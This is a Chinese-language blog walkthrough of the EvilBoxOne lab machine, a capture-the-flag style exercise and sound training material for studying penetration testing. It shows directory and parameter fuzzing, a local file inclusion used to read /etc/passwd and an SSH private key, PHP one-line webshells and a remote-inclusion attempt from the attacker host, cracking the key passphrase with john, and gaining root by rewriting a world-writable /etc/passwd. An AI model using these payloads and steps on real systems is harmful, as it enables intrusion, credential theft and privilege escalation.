---
title: 打靶练习6-EvilBoxOne
tags: 打靶
categories: 红队技术
date: 2022-11-18 09:38:12
---

gobuster目录扫描 | ffuf参数fuzz | 文件包含 | php封装器 | ssh私钥读取 | ssh私钥爆破 | 写入/etc/passwd提权

<!-- more -->




## 主机发现

ping网段

```
fping -gaq 172.16.42.0/24

172.16.42.1
172.16.42.147
172.16.42.206

确认主机172.16.42.206
```



nmap全端口扫描

```
sudo nmap -p- 172.16.42.206

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```



服务识别

```
sudo nmap -p22,80 -A 172.16.42.206

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```





## web入侵

### gobuster目录扫描

使用seclists字典

```
gobuster dir -u http://172.16.42.206/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp
```

发现secret目录，继续在secret目录下目录爆破

```
gobuster dir -u http://172.16.42.206/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp
```



### 参数fuzz

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w ~/pentest/wordlist/shadowflow/para-value.txt:VAL -u http://172.16.42.206/secret/evil.php\?PARAM\=VAL -fs 0
```

未发现可用参数



### 测试文件包含

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://172.16.42.206/secret/evil.php\?FUZZ=../index.html -fs 0
```

fuzz出了command，任意文件读取

```
http://172.16.42.206/secret/evil.php?command=../../../../../../../../etc/passwd


root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```



### 远程文件包含

自己kali放入一句话木马

```
<?php @eval($_POST['pass']);?>
<?php eval($_POST['123'])?>
<?php eval($_POST['123']);?>
<?php $var=shell_exec($_GET['cmd']); echo $var ?>
```

我这里使用`<?php $var=shell_exec($_GET['cmd']); echo $var ?>`

`http://172.16.42.206/secret/evil.php?command=http://172.16.42.147/a.php?cmd=id`，失败



### php封装器

默认包含了很多封装器/协议，比如php 、file、ftp、data、zip等。

通过php封装器读取源码

```
http://172.16.42.206/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php
```

结果

```
PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==
```

解码

```php
<?php
    $filename = $_GET['command'];
    include($filename);
?>

```

尝试写入php文件

```
[root@kali html]# echo -n 123 | base64
MTIz

#发起http请求写入
http://172.16.42.206/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&txt=MTIz

#读取
http://172.16.42.206/secret/evil.php?command=php://filter/convert.base64-encode/resource=test.php

#并没有读取到，说明不成功。
```



### ssh秘钥获取

通过读取/etc/passwd文件，发现有mowree用户。

ssh登录尝试，-v参数收集认证信息`ssh mowree@172.16.42.206 -v`

```
[root@kali html]# ssh mowree@172.16.42.206 -v
OpenSSH_8.4p1 Debian-6, OpenSSL 1.1.1i  8 Dec 2020
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to 172.16.42.206 [172.16.42.206] port 22.
debug1: Connection established.
debug1: identity file /root/.ssh/id_rsa type -1
debug1: identity file /root/.ssh/id_rsa-cert type -1
debug1: identity file /root/.ssh/id_dsa type -1
debug1: identity file /root/.ssh/id_dsa-cert type -1
debug1: identity file /root/.ssh/id_ecdsa type -1
debug1: identity file /root/.ssh/id_ecdsa-cert type -1
debug1: identity file /root/.ssh/id_ecdsa_sk type -1
debug1: identity file /root/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /root/.ssh/id_ed25519 type -1
debug1: identity file /root/.ssh/id_ed25519-cert type -1
debug1: identity file /root/.ssh/id_ed25519_sk type -1
debug1: identity file /root/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /root/.ssh/id_xmss type -1
debug1: identity file /root/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.4p1 Debian-6
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.9p1 Debian-10+deb10u2
debug1: match: OpenSSH_7.9p1 Debian-10+deb10u2 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 172.16.42.206:22 as 'mowree'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM
debug1: Host '172.16.42.206' is known and matches the ECDSA host key.
debug1: Found key in /root/.ssh/known_hosts:4
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: /root/.ssh/id_rsa
debug1: Will attempt key: /root/.ssh/id_dsa
debug1: Will attempt key: /root/.ssh/id_ecdsa
debug1: Will attempt key: /root/.ssh/id_ecdsa_sk
debug1: Will attempt key: /root/.ssh/id_ed25519
debug1: Will attempt key: /root/.ssh/id_ed25519_sk
debug1: Will attempt key: /root/.ssh/id_xmss
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: /root/.ssh/id_rsa
debug1: Trying private key: /root/.ssh/id_dsa
debug1: Trying private key: /root/.ssh/id_ecdsa
debug1: Trying private key: /root/.ssh/id_ecdsa_sk
debug1: Trying private key: /root/.ssh/id_ed25519
debug1: Trying private key: /root/.ssh/id_ed25519_sk
debug1: Trying private key: /root/.ssh/id_xmss
debug1: Next authentication method: password
```

其中`debug1: Authentications that can continue: publickey,password`表示可以通过秘钥或者密码认证。



读取公钥

```
http://172.16.42.206/secret/evil.php?command=../../../../home/mowree/.ssh/authorized_keys
```

结果

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne
```

可以看见是rsa算法，于是可以读取私钥

```
http://172.16.42.206/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa
```

私钥结果

`view-source:http://172.16.42.206/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa`

查看源码方式读取比较友好

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```



私钥登录:  创建一个id_rsa文件

```
[root@kali /tmp]# vi id_rsa
[root@kali /tmp]# chmod 600 id_rsa
[root@kali /tmp]# ssh mowree@172.16.42.206 -i ./id_rsa
```

登录发现要输入key
```
[root@kali /tmp]# ssh mowree@172.16.42.206 -i ./id_rsa
Enter passphrase for key './id_rsa':
```

访问私钥也需要认证。

这时候需要本地密码破解



### ssh爆破

- 将id_rsa转为john可识别格式。

  ```
  [root@kali john]# cd /usr/share/john
  [root@kali john]# ./ssh2john.py /tmp/id_rsa > /tmp/hash
  ```

  

- 生成字典

  ```
  [root@kali /tmp]# cp /usr/share/wordlists/rockyou.txt.gz ./
  [root@kali /tmp]# gunzip rockyou.txt.gz
  ```

- 开始爆破`john hash --wordlist=rockyou.txt`

  ```
  [root@kali /tmp]# john hash --wordlist=rockyou.txt
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
  Cost 2 (iteration count) is 2 for all loaded hashes
  Will run 4 OpenMP threads
  Note: This format may emit false positives, so it will keep trying even after
  finding a possible candidate.
  Press 'q' or Ctrl-C to abort, almost any other key for status
  unicorn          (/tmp/id_rsa)
  Warning: Only 2 candidates left, minimum 4 needed for performance.
  1g 0:00:00:08 DONE (2022-11-18 05:18) 0.1142g/s 1639Kp/s 1639Kc/s 1639KC/sa6_123..*7¡Vamos!
  Session completed
  ```

  破解出了加密密码unicorn



再次登录

```
[root@kali /tmp]# ssh mowree@172.16.42.206 -i ./id_rsa
Enter passphrase for key './id_rsa':
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$
```

成功。

第一个flag

```
mowree@EvilBoxOne:~$ cat user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```





## 提权

### 内核提权

```
mowree@EvilBoxOne:~$ uname -a
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
```

搜索内核漏洞

```
[root@kali ~]# searchsploit linux 4.19
```



没有利用成功





### suid提权

命令： `find / -perm /4000 2>/dev/null`

```
mowree@EvilBoxOne:~$ find / -perm /4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
```

没有可用的，都是默认的

查看sgid

```
mowree@EvilBoxOne:~$ find / -perm /2000 2>/dev/null
/run/log/journal
/run/log/journal/e24bbdcfd6de4ae7a8b91fa945905e5b
/usr/sbin/unix_chkpwd
/usr/bin/bsd-write
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/usr/local/lib/python3.7
/usr/local/lib/python3.7/dist-packages
/var/mail
/var/local
```

也没有异常。



### 写入文件提权

找可写权限，并且排除掉proc目录（该目录太多了，扰乱视线）

```
find / -writable 2>/dev/null | grep -v proc
```

发现/etc/passwd可写入。

```
mowree@EvilBoxOne:~$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
```

可用看见任何用户都是可写的。

```
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash

用户名称:密码(安全考虑，linux都将密码放到另一个文件/etc/shadow):用户id:组id:其他信息:主目录:登录后默认shell
```

如果我们将x替换为密码，就可以生效。



使用openssl生成123的密码，-1是指一种加密算法

```
mowree@EvilBoxOne:~$ openssl passwd -1
Password:
Verifying - Password:
$1$ZDTsBsag$KEzTiDFkq7JxWKpWltQ8h0
```



vi /etc/passwd将root账号密码替换成生成的密码

```
root:$1$ZDTsBsag$KEzTiDFkq7JxWKpWltQ8h0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```



su到root用户
```
mowree@EvilBoxOne:~$ su root
Contraseña:
#输入密码123

#获取flag
root@EvilBoxOne:/home/mowree# cd
root@EvilBoxOne:~# whoami
root
```



读取flag

```
root@EvilBoxOne:~# cat root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```



读取成功



























































































